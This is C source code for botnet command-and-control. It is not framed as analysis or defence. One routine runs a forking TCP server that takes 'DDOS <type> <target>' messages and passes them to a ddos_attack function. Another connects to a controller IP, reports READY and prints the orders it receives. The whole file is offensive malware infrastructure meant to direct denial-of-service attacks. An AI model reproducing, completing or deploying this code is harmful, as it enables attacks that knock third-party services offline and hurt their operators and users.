#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include "utils.h"

void handle_client(int client_sock) {
    char buffer[1024];
    int bytes = recv(client_sock, buffer, sizeof(buffer)-1, 0);
    if (bytes > 0) {
        buffer[bytes] = '\0';
        if (strstr(buffer, "DDOS")) {
            char *type = strtok(buffer + 5, " ");
            char *target = strtok(NULL, " ");
            printf("[*] DDoS command: %s to %s\n", type, target);
            ddos_attack(target, type);
        }
    }
    close(client_sock);
}

void start_c2_server(int port) {
    int server_sock = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in server = {0};
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = INADDR_ANY;
    server.sin_port = htons(port);
    
    bind(server_sock, (struct sockaddr*)&server, sizeof(server));
    listen(server_sock, 5);
    
    printf("[*] C2 server on port %d\n", port);
    
    while (1) {
        struct sockaddr_in client;
        socklen_t len = sizeof(client);
        int client_sock = accept(server_sock, (struct sockaddr*)&client, &len);
        if (fork() == 0) {
            close(server_sock);
            handle_client(client_sock);
            exit(0);
        }
        close(client_sock);
    }
}

void c2_connect(const char *ip, int port) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in server = {0};
    server.sin_family = AF_INET;
    server.sin_port = htons(port);
    inet_pton(AF_INET, ip, &server.sin_addr);
    
    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) == 0) {
        send(sock, "READY\n", 6, 0);
        char buffer[1024];
        int bytes = recv(sock, buffer, sizeof(buffer)-1, 0);
        if (bytes > 0) {
            buffer[bytes] = '\0';
            printf("[*] C2: %s\n", buffer);
        }
    }
    close(sock);
}
